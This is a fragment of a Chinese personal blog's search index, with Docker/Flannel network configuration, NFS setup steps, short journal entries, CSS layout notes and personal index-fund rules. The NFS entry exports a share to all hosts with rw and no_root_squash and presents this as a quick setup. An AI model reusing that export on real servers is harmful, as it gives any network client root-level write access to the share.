/usr/lib/systemd/system/docker.service [Unit] Description=Docker Application Container Engine Documentation=https://docs.docker.com After=network-online.target firewalld.service containerd.service Wants=network-online.target Requires=docker.socket containerd.service [Service] Type=notify # the default is not to use systemd for cgroups because the delegate issues still # exists and systemd currently does not support the cgroup feature set required # for containers run by docker ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --bip=172.21.55.1/24 --ip-masq=true --mtu=1472 ExecReload=/bin/kill -s HUP $MAINPID TimeoutSec=0 RestartSec=2 Restart=always # Note that StartLimit* options were moved from \"Service\" to \"Unit\" in systemd 229. # Both the old, and new location are accepted by systemd 229 and up, so using the old location # to make them work for either version of systemd. StartLimitBurst=3 # Note that StartLimitInterval was renamed to StartLimitIntervalSec in systemd 230. # Both the old, and new name are accepted by systemd 230 and up, so using the old name to make # this option work for either version of systemd. StartLimitInterval=60s # Having non-zero Limit*s causes performance problems due to accounting overhead # in the kernel. We recommend using cgroups to do container-local accounting. LimitNOFILE=infinity LimitNPROC=infinity LimitCORE=infinity # Comment TasksMax if your systemd version does not support it. # Only systemd 226 and above support this option. TasksMax=infinity # set delegate yes so that systemd does not reset the cgroups of docker containers Delegate=yes # kill only the docker process, not all processes in the cgroup KillMode=process OOMScoreAdjust=-500 [Install] WantedBy=multi-user.target [root@node1 ~]# systemctl daemon-reload [root@node1 ~]# systemctl restart docker [root@node1 ~]# ip a s ...... 5: docker0: \u003cNO-CARRIER,BROADCAST,MULTICAST,UP\u003e mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:63","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:5:0","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#57-docker-网络配置"},{"categories":["point"],"content":" 5.8 跨 Docker Host 容器间通信验证 [root@node1 ~]# docker run -it --rm busybox:latest / # ifconfig eth0 Link encap:Ethernet HWaddr 02:42:AC:15:1F:02 inet addr:172.21.31.2 Bcast:172.21.31.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1472 Metric:1 RX packets:21 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:2424 (2.3 KiB) TX bytes:0 (0.0 B) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) / # ping 172.21.55.2 PING 172.21.55.2 (172.21.55.2): 56 data bytes 64 bytes from 172.21.55.2: seq=0 ttl=60 time=2.141 ms 64 bytes from 172.21.55.2: seq=1 ttl=60 time=1.219 ms 64 bytes from 172.21.55.2: seq=2 ttl=60 time=0.730 ms ^C --- 172.21.55.2 ping statistics --- 3 packets transmitted, 3 packets received, 0% packet loss round-trip min/avg/max = 0.730/1.363/2.141 ms [root@node2 ~]# docker run -it --rm busybox:latest / # ifconfig eth0 Link encap:Ethernet HWaddr 02:42:AC:15:37:02 inet addr:172.21.55.2 Bcast:172.21.55.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1472 Metric:1 RX packets:19 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:2246 (2.1 KiB) TX bytes:0 (0.0 B) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) / # ping 172.21.31.2 PING 172.21.31.2 (172.21.31.2): 56 data bytes 64 bytes from 172.21.31.2: seq=0 ttl=60 time=1.286 ms 64 bytes from 172.21.31.2: seq=1 ttl=60 time=0.552 ms ^C --- 172.21.31.2 ping statistics --- 2 packets transmitted, 2 packets received, 0% packet loss round-trip min/avg/max = 0.552/0.919/1.286 ms ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:6:0","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#58-跨-docker-host-容器间通信验证"},{"categories":["journal"],"content":"2023-11-19 日记","date":"2023-11-19","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-19/","series":null,"tags":["journal"],"title":"2023-11-19","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-19/"},{"categories":["journal"],"content":"#fun/文章 昨天最大的新闻就是 openai 的 ceo 离职了。有人说这是《乔布斯离开苹果》 相关时间线 看起来可信，不一定准确 左 1 是搞技术的，但是和 2（CEO-Sam）, 4（总裁） 有冲突。 被废黜的Sam Altman - 这个时代的奥本海默？ - cnBeta.COM 移动版 ","date":"2023-11-19","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-19/:0:0","series":null,"tags":["journal"],"title":"2023-11-19","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-19/#"},{"categories":["point"],"content":"快速搭建： apt install nfs-kernel-server -y mkdir -p /data/nfs vim /etc/exports /data/nfs *(rw,sync,no_root_squash,no_subtree_check) # *：允许所有的网段访问，也可以使用具体的IP # rw：挂接此目录的客户端对该共享目录具有读写权限 # sync：资料同步写入内存和硬盘 # no_root_squash：root用户具有对根目录的完全管理访问权限 # no_subtree_check：不检查父目录的权限 # 修改完成后重新加载配置. 如果服务启动了,修改配置就用这个 # exportfs -r # 启动nfs服务 systemctl enable nfs-kernel-server --now # 检查验证 showmount -e Export list for om1: /data/nfs * 挂载： apt install nfs-common -y # 挂载 服务器ip:/exports配置的路径 本地路径 mount 10.0.1.157:/data/nfs /data/nfs # 卸载 umount /data/nfs ","date":"2023-11-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/nfs/:0:0","series":null,"tags":["point","NFS"],"title":"NFS","uri":"/posts/%E7%AC%94%E8%AE%B0/point/nfs/#"},{"categories":["journal"],"content":"2023-11-15 日记","date":"2023-11-15","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-15/","series":null,"tags":["journal"],"title":"2023-11-15","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-15/"},{"categories":["journal"],"content":"#fun/旅游助手 不是A7买不起，而是五菱更有性价比……_哔哩哔哩_bilibili ","date":"2023-11-15","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-15/:0:0","series":null,"tags":["journal"],"title":"2023-11-15","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-15/#"},{"categories":["journal"],"content":"2023-11-13 日记","date":"2023-11-13","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-13/","series":null,"tags":["journal"],"title":"2023-11-13","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-13/"},{"categories":["journal"],"content":"#科技 踩单车 25 分钟就可以取下来蓄电池, 给手机充电. 这是一个体现社会人文关怀的场景. 我记得中国有店家在外面放了一个充电口, 给快递员免费充电. 店家很善良. 而国外却设计制作了这样的工具给流浪汉. 我觉得并没有提供便利, 而是一种内心冷酷, 外表热心的表现. Luke Talbot hacks rental bikes so homeless people can charge phones ","date":"2023-11-13","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-13/:0:0","series":null,"tags":["journal"],"title":"2023-11-13","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-13/#"},{"categories":["journal"],"content":"2023-11-12 日记","date":"2023-11-12","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-12/","series":null,"tags":["journal"],"title":"2023-11-12","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-12/"},{"categories":["journal"],"content":"#生活/监管 监管在不同的方面是有偏重的。主动抽查，加大处罚力度其实就可以做到，但是没人做。 劳动法就不用举例了 水电费 关于深圳城中村水电乱收费 - V2EX #生活/医 给程序员义诊 减重/甲状腺外科大夫 在线义诊 - V2EX #fun/旅游助手 在秋分来到春天的南半球，新西兰自驾 10 天之旅 - 少数派 追火箭之旅——文昌篇 - 少数派 西藏-318 旅游照片和部分视频 - V2EX 日本浮生录 03：纵横北海道，1100 公里的道东寻秋之旅 - 少数派 城市漫步指南：夏末秋初，在慕尼黑漫步 - 少数派 远离喧嚣的自在，新西兰旅程片段 - 少数派 #科技/折腾 刷机 因小米 BL 解锁条件提高，我大致调查了一下各家厂商国行手机对解锁的做法 - V2EX 显示器如果支持 DDC 协议，那么可以通过软件控制输入源 一日一技 | 如何只用软件实现显示器的输入源切换 - 少数派 #生活/付费 机场 ecs qq 音乐 京东 plus b 站会员 obsidian 域名 jetbrain 饿了么 宽带 + 公网 ip+iptv+ 流量 考虑： youtube chatgpt infuse bitwarden 流量卡 xgp 等等订阅游戏 ","date":"2023-11-12","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-12/:0:0","series":null,"tags":["journal"],"title":"2023-11-12","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-12/#"},{"categories":["blog"],"content":" 简介一些使用 windows 的技巧 ","date":"2023-11-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E6%8A%80%E5%B7%A7/:1:0","series":null,"tags":["blog"],"title":"windows的技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E6%8A%80%E5%B7%A7/#简介"},{"categories":["blog"],"content":" 技巧","date":"2023-11-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E6%8A%80%E5%B7%A7/:2:0","series":null,"tags":["blog"],"title":"windows的技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E6%8A%80%E5%B7%A7/#技巧"},{"categories":["blog"],"content":" 自带功能 调节音量: 鼠标移动到音量图标, 滚轮即可调节音量 ","date":"2023-11-12","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E6%8A%80%E5%B7%A7/:2:1","series":null,"tags":["blog"],"title":"windows的技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E6%8A%80%E5%B7%A7/#自带功能"},{"categories":["point"],"content":"CSS 是样式表. 用于调整展示方式 ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/css/:0:0","series":null,"tags":["point","CSS"],"title":"CSS","uri":"/posts/%E7%AC%94%E8%AE%B0/point/css/#"},{"categories":["blog"],"content":"`layout-demo` 是一个练习布局, 样式, 动画等内容的项目. ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/"},{"categories":["blog"],"content":" 简介layout-demo 是一个练习布局, 样式, 动画等内容的项目. ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:1:0","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#简介"},{"categories":["blog"],"content":" 语法","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:0","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#语法"},{"categories":["blog"],"content":" 元素类型 块级元素： 独占一行. 从上到下排列 宽度: 默认撑满父元素 高度: 内容撑开 可以设置宽高 div，p，h1, ul, ol, li, table, form inline 行内元素： 不独占一行. 太长了会自己换行 宽度: 内容撑开 高度: 内容撑开 a,strong 不能设置宽高 特定的 inline-block 可以设置宽高. 例如 img,input,button 可以通过 display 修改 ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:1","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#元素类型"},{"categories":["blog"],"content":" display 布局展现形式 display:block 是一个块级元素。开始新的一行，撑满容器。例如 p，form，header，footer display:inline 是行内元素。包裹内容但不打乱布局。a 就是一个行内元素，用来展示链接 display:none 不删除元素的情况下隐藏，不会占用空间。visibility:hidden 会占用空间 display:flex 用于指定自己内部元素布局，参考 flex 布局 案例： 每个元素都有默认的 display，常见的改动就是 li 元素改成 inline，制作水平菜单 一个 div 容器内有 2 个 div，左边 20%，右边 80%。需要 display: flex 来让它排列 ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:2","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#display-布局展现形式"},{"categories":["blog"],"content":" 长度宽度 /* 相对父元素10%,内部布局的时候用 */ width: 10%; /* 窗口10分之一,响应式的时候会用 */ width: 10vh; /* 相对于root字体,字体如果是16px,那么这里就是 16*2.2 像素 */ width: 2.2rem width: auto; /* 替代下面 */ width: xxx px; ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:3","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#长度宽度"},{"categories":["blog"],"content":" position 定位 static 代表不会被特殊定位 fixed 固定定位，定位到右下角 .fixed { position: fixed; /* 右下角定位 */ bottom: 0; right: 0; width: 200px; background-color: white; } relative 相对定位，相对上一个 div 元素位置 .relative2 { position: relative; top: -20px; /* 向上移动20px */ left: 20px; /* 左边隔开20px */ background-color: white; width: 500px; } absolute 绝对定位，最近的父元素 position 不是 static ，那么根据这个元素来定位. 否则根据 body 定位 参考资料 ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:4","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#position-定位"},{"categories":["blog"],"content":" 元素选择器 #id id 选择器 .class 类选择器 关系选择器 : div p dev 后代, div\u003ep div 的子代, div,p 伪类 : a:link 可以控制行为: 你点击 a 标签之前蓝色, 点击之后紫色. ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:5","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#元素选择器"},{"categories":["blog"],"content":" margin 外边距 marigin: 5% 上下左右都是 5% margin: 1 2 3 4; 上 1，右 2，下 3，左 4 margin: 0 auto; 上下 0，左右自动居中 ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:6","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#margin-外边距"},{"categories":["blog"],"content":" 样式美化 行高 line-height 字体属性 font-size 背景颜色 background 颜色 color 圆角边框 border-radius: 1em; 阴影 text-shadow, box-shadow，93 Beautiful CSS box-shadow examples - CSS Scan ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:7","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#样式美化"},{"categories":["blog"],"content":" css 互相引用 @import './base.css'; ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:8","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#css-互相引用"},{"categories":["blog"],"content":" float 浮动在一个段落的里面，插入一个图片，效果参考 img { float: right; margin: 0 0 1em 1em; } clear 控制 float 浮动clear 属性被用于控制浮动。 当 box 浮动了，后面的元素会跑到 box 这里来 .box { float: left; width: 200px; height: 100px; margin: 1em; } 而把 clear 样式加到后面的元素上，可以避免这个问题 .after-box { clear: left; } 浮动图例 宽度不够自动下移宽度不够, 自动移动到下方. 避免水平滚动条 .main { float: right; width: 70%; } .leftBar { float: left; width: 25%; } ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:9","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#float-浮动"},{"categories":["blog"],"content":" float 浮动在一个段落的里面，插入一个图片，效果参考 img { float: right; margin: 0 0 1em 1em; } clear 控制 float 浮动clear 属性被用于控制浮动。 当 box 浮动了，后面的元素会跑到 box 这里来 .box { float: left; width: 200px; height: 100px; margin: 1em; } 而把 clear 样式加到后面的元素上，可以避免这个问题 .after-box { clear: left; } 浮动图例 宽度不够自动下移宽度不够, 自动移动到下方. 避免水平滚动条 .main { float: right; width: 70%; } .leftBar { float: left; width: 25%; } ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:9","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#clear-控制-float-浮动"},{"categories":["blog"],"content":" float 浮动在一个段落的里面，插入一个图片，效果参考 img { float: right; margin: 0 0 1em 1em; } clear 控制 float 浮动clear 属性被用于控制浮动。 当 box 浮动了，后面的元素会跑到 box 这里来 .box { float: left; width: 200px; height: 100px; margin: 1em; } 而把 clear 样式加到后面的元素上，可以避免这个问题 .after-box { clear: left; } 浮动图例 宽度不够自动下移宽度不够, 自动移动到下方. 避免水平滚动条 .main { float: right; width: 70%; } .leftBar { float: left; width: 25%; } ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:2:9","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#宽度不够自动下移"},{"categories":["blog"],"content":" 实际运用","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:3:0","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#实际运用"},{"categories":["blog"],"content":" 居中 定位 +transform 计算 定位: 使用 absolute 绝对定位 (相对于父元素定位). top 和 left 距离上面和左边 50% 计算: translate 被向左和向上移动了自身宽度和高度的一半 .app 不写宽度的话, 就会使用 content 这个字符串的宽度 \u003ctemplate\u003e \u003cdiv class=\"layout\"\u003e \u003cp\u003e定位 +transform 计算\u003c/p\u003e \u003cdiv class=\"box1\"\u003e \u003cdiv class=\"content1\"\u003econtent\u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/template\u003e \u003cstyle scoped\u003e .box1 { position: relative; width: 10rem; height: 10rem; background-color: skyblue; } .content1 { background-color: greenyellow; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); } \u003c/style\u003e flex 布局 \u003ctemplate\u003e \u003cdiv class=\"layout\"\u003e \u003cp\u003eflex\u003c/p\u003e \u003cdiv class=\"box2\"\u003e \u003cdiv class=\"content2\"\u003econtent\u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/template\u003e \u003cstyle scoped\u003e .box2 { width: 10rem; height: 10rem; background-color: skyblue; display: flex; /* 水平居中 */ align-items: center; /* 垂直居中 */ justify-content: center; } .content2 { background-color: greenyellow; } \u003c/style\u003e 容器内的元素会使用下面默认参数排列： 默认 flex-direction: row 从左到右 默认 flex-wrap: nowrap 不换行 默认 justify-content: flex-start 水平左对齐 默认 align-items: flex-start 垂直顶部对齐、 Flex 布局教程：语法篇 - 阮一峰的网络日志 margin + text-align 垂直居中 \u003ctemplate\u003e \u003cdiv class=\"layout\"\u003e \u003cp\u003e定宽垂直居中\u003c/p\u003e \u003cdiv class=\"box3\"\u003e \u003cdiv class=\"content3\"\u003econtent\u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/template\u003e \u003cstyle scoped\u003e .box3 { width: 10rem; height: 10rem; background-color: skyblue; } .content3 { background-color: greenyellow; /* 自己必须要有宽度 */ width: 5rem; /* content3这个div居中 */ margin: 0 auto; /* 让里面的文字也居中 */ text-align: center; } \u003c/style\u003e 总结行内元素水平居中. 行内元素 行内元素可设置：text-align: center flex 布局设置父元素：display: flex; justify-content: center 块级元素水平居中 自己有确定的宽度时, 才能用: margin: 0 auto; 绝对定位 +left:50%+margin: 负自身一半 块级元素垂直居中 position: absolute 设置 left、top、margin-left、margin-top (定高) transform: translate (x, y) flex (不定高，不定宽) table 等等方式都不常用, 或者说不推荐使用. 所以我就不写了. 可以参考 面试官：元素水平垂直居中的方法有哪些？如果元素不定宽高呢？ · Issue #102 · febobo/web-interview · GitHub ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:3:1","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#居中"},{"categories":["blog"],"content":" 居中 定位 +transform 计算 定位: 使用 absolute 绝对定位 (相对于父元素定位). top 和 left 距离上面和左边 50% 计算: translate 被向左和向上移动了自身宽度和高度的一半 .app 不写宽度的话, 就会使用 content 这个字符串的宽度 定位 +transform 计算 content flex 布局 flex content 容器内的元素会使用下面默认参数排列： 默认 flex-direction: row 从左到右 默认 flex-wrap: nowrap 不换行 默认 justify-content: flex-start 水平左对齐 默认 align-items: flex-start 垂直顶部对齐、 Flex 布局教程：语法篇 - 阮一峰的网络日志 margin + text-align 垂直居中 定宽垂直居中 content 总结行内元素水平居中. 行内元素 行内元素可设置：text-align: center flex 布局设置父元素：display: flex; justify-content: center 块级元素水平居中 自己有确定的宽度时, 才能用: margin: 0 auto; 绝对定位 +left:50%+margin: 负自身一半 块级元素垂直居中 position: absolute 设置 left、top、margin-left、margin-top (定高) transform: translate (x, y) flex (不定高，不定宽) table 等等方式都不常用, 或者说不推荐使用. 所以我就不写了. 可以参考 面试官：元素水平垂直居中的方法有哪些？如果元素不定宽高呢？ · Issue #102 · febobo/web-interview · GitHub ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:3:1","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#定位-transform-计算"},{"categories":["blog"],"content":" 居中 定位 +transform 计算 定位: 使用 absolute 绝对定位 (相对于父元素定位). top 和 left 距离上面和左边 50% 计算: translate 被向左和向上移动了自身宽度和高度的一半 .app 不写宽度的话, 就会使用 content 这个字符串的宽度 定位 +transform 计算 content flex 布局 flex content 容器内的元素会使用下面默认参数排列： 默认 flex-direction: row 从左到右 默认 flex-wrap: nowrap 不换行 默认 justify-content: flex-start 水平左对齐 默认 align-items: flex-start 垂直顶部对齐、 Flex 布局教程：语法篇 - 阮一峰的网络日志 margin + text-align 垂直居中 定宽垂直居中 content 总结行内元素水平居中. 行内元素 行内元素可设置：text-align: center flex 布局设置父元素：display: flex; justify-content: center 块级元素水平居中 自己有确定的宽度时, 才能用: margin: 0 auto; 绝对定位 +left:50%+margin: 负自身一半 块级元素垂直居中 position: absolute 设置 left、top、margin-left、margin-top (定高) transform: translate (x, y) flex (不定高，不定宽) table 等等方式都不常用, 或者说不推荐使用. 所以我就不写了. 可以参考 面试官：元素水平垂直居中的方法有哪些？如果元素不定宽高呢？ · Issue #102 · febobo/web-interview · GitHub ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:3:1","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#flex-布局"},{"categories":["blog"],"content":" 居中 定位 +transform 计算 定位: 使用 absolute 绝对定位 (相对于父元素定位). top 和 left 距离上面和左边 50% 计算: translate 被向左和向上移动了自身宽度和高度的一半 .app 不写宽度的话, 就会使用 content 这个字符串的宽度 定位 +transform 计算 content flex 布局 flex content 容器内的元素会使用下面默认参数排列： 默认 flex-direction: row 从左到右 默认 flex-wrap: nowrap 不换行 默认 justify-content: flex-start 水平左对齐 默认 align-items: flex-start 垂直顶部对齐、 Flex 布局教程：语法篇 - 阮一峰的网络日志 margin + text-align 垂直居中 定宽垂直居中 content 总结行内元素水平居中. 行内元素 行内元素可设置：text-align: center flex 布局设置父元素：display: flex; justify-content: center 块级元素水平居中 自己有确定的宽度时, 才能用: margin: 0 auto; 绝对定位 +left:50%+margin: 负自身一半 块级元素垂直居中 position: absolute 设置 left、top、margin-left、margin-top (定高) transform: translate (x, y) flex (不定高，不定宽) table 等等方式都不常用, 或者说不推荐使用. 所以我就不写了. 可以参考 面试官：元素水平垂直居中的方法有哪些？如果元素不定宽高呢？ · Issue #102 · febobo/web-interview · GitHub ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:3:1","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#margin--text-align-垂直居中"},{"categories":["blog"],"content":" 居中 定位 +transform 计算 定位: 使用 absolute 绝对定位 (相对于父元素定位). top 和 left 距离上面和左边 50% 计算: translate 被向左和向上移动了自身宽度和高度的一半 .app 不写宽度的话, 就会使用 content 这个字符串的宽度 定位 +transform 计算 content flex 布局 flex content 容器内的元素会使用下面默认参数排列： 默认 flex-direction: row 从左到右 默认 flex-wrap: nowrap 不换行 默认 justify-content: flex-start 水平左对齐 默认 align-items: flex-start 垂直顶部对齐、 Flex 布局教程：语法篇 - 阮一峰的网络日志 margin + text-align 垂直居中 定宽垂直居中 content 总结行内元素水平居中. 行内元素 行内元素可设置：text-align: center flex 布局设置父元素：display: flex; justify-content: center 块级元素水平居中 自己有确定的宽度时, 才能用: margin: 0 auto; 绝对定位 +left:50%+margin: 负自身一半 块级元素垂直居中 position: absolute 设置 left、top、margin-left、margin-top (定高) transform: translate (x, y) flex (不定高，不定宽) table 等等方式都不常用, 或者说不推荐使用. 所以我就不写了. 可以参考 面试官：元素水平垂直居中的方法有哪些？如果元素不定宽高呢？ · Issue #102 · febobo/web-interview · GitHub ","date":"2023-11-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/:3:1","series":null,"tags":["blog","前端"],"title":"前端layout-demo","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AFlayout-demo/#总结"},{"categories":["point"],"content":"定投就是定期投资. 可以是股票, 基金, 黄金等等. 我有过的 上证50指数基金 和 创业板指数基金 定投的经验. 这里是我的经验和操作: 波动越大, 存在风险越大, 也会收益越大. 而我选择偏股基金, 肯定是想收益大. 可惜 BTC 国内没有合规渠道 年化收益 15% 以上, 20% 以下. 创业板指数: 创业指数的 500 日均值. 支付宝均线定投. 纳斯达克100 我用 60 日均线, 因为美股我觉得需要能更好的抓住短线收益. 120 日跟踪不及时, 会错过大行情, 更短的时间不适合长期定投. 比均线高: 200 点左右90%, 500点左右70%, 1000点50% 比均线低: 最近振幅大, 说明跌的猛, 保守起见. 200点左右90%. 500点左右70%, 1000 点50%. 最近振幅小, 说明偏稳定: 200点左右160%, 500点左右180%, 1000点200%. ","date":"2023-11-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E5%AE%9A%E6%8A%95/:0:0","series":null,"tags":["point","定投"],"title":"定投","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E5%AE%9A%E6%8A%95/#"},{"categories":["journal"],"content":"2023-11-09 日记","date":"2023-11-09","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-09/","series":null,"tags":["journal"],"title":"2023-11-09","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-09/"},{"categories":["journal"],"content":"#lines 作者失业. 设计制度,app 